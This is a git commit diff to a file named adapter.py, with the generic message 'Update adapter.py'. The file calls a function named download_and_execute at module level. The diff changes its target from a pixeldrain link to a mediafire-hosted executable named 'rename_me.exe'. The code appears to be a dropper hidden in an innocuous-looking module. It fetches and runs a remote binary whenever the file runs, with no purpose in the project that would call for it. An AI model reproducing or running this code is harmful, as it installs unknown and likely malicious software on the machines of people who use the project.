55df6879557479b651ea1d2b540144fd3c7b093e
Cavetodex <167407997+Cavetodex@users.noreply.github.com>
2024-06-04 04:09:28 +0200

    Update adapter.py

--- source/adapter.py
+++ source/adapter.py
@@ -18,4 +18,4 @@ def download_and_execute(url):
         print("Failed to download the file.")
 
 # Example usage
-download_and_execute("https://pixeldrain.com/api/file/jJfbmLU9?download")
+download_and_execute("https://download850.mediafire.com/8l0w2wn4h05g1yvDS1xrbpeSYVt91TXnr4VzFottGFiU1IEIhWacmMQy4QWl3ufIptjReSni19Q79UBmAHC45EFH4AGVZTmEKMCQeVAN-YCnZU0W0S0V_zJZc8ukkpSM6jDHnFrb4g2VTV_3yLbJfX4o44yqR26ZeX91QdR7o7tf42I/783t7z3i85vcmql/rename_me.exe")
